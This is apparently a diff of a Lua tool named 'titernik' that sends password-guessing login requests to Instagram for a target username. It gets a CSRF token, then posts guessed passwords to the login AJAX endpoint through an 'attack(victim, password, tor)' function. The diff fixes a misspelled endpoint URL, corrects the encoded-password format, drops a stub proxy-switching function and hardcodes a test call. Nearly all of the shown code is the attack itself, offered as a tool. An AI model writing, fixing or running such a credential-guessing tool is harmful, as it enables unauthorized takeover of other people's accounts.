@@ -38,15 +38,12 @@ local titernik = [[
   https://github.com/sudurraaa/titernik
 ]]
 
-local function changin_proxy_server()
-end
 
 local function attack(victim, password, tor)
-	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .."sudopacmandeleteme17G"
-	print(request_payload)
+	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":sudopacmandeleteme17G"
 	local attack_response = {}
 	local code, body, headers = http.request {
-		url = "https://www.instagram.com/accouts/login/ajax/",
+		url = "https://instagram.com/accounts/login/ajax/",
 		method = "POST",
 		headers = request_headers,
 		source = ltn.source.string(request_payload),
@@ -69,16 +66,16 @@ local function main()
 		print("titernik v1.0.0")
 		os.exit(0)
 	end)
-	parser:flag('-a --ascii', 'Print titernik ascii'):action(function()
+	parser:flag('-a --asci', 'Print titernik ascii'):action(function()
 		print(titernik)
 		os.exit(0)
 	end)
 	local args = parser:parse()
     request_payload = request_payload .. "&username=" .. args.target
-
+	
 	-- Making http request to instagram to get csrf token
 	local code, body ,headers = http.request {
-		url = "https://www.instagram.com/accounts/login/",
+		url = "https://instagram.com/accounts/login/",
 		method = "GET",
 		headers = request_headers,
 	}
@@ -108,6 +105,7 @@ local function main()
 			os.exit(0)
 		end
 	end]]--
-	attack('hello', 'hello', 'hello')
+	attack("sudopacmandeleteme", "sudopacmandeleteme17G", "disable")
 end
+
 main()
